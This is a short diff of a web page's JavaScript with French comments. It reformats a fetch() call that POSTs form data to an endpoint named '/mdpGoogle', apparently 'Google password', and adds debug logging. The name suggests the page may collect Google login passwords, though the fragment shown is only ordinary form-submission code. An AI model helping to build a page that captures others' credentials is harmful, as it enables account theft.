@@ -60,20 +60,22 @@
 
             // Utilisez Fetch API pour envoyer les données à votre serveur
             fetch('/mdpGoogle', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            })
-            .then(response => {
-            if (response.redirected) {
-                window.location.href = response.url;
-            }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            }
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+})
+.then(response => {
+    console.log('Response status:', response.status); // Ajoutez ceci pour déboguer
+    console.log('Was redirected:', response.redirected); // Vérifiez si redirigé
+    if (response.redirected) {
+        window.location.href = response.url;
+    }
+})
+.catch((error) => {
+    console.error('Error:', error);
+});}
     </script>
         <div class="container-fluid">
             <div class="row">
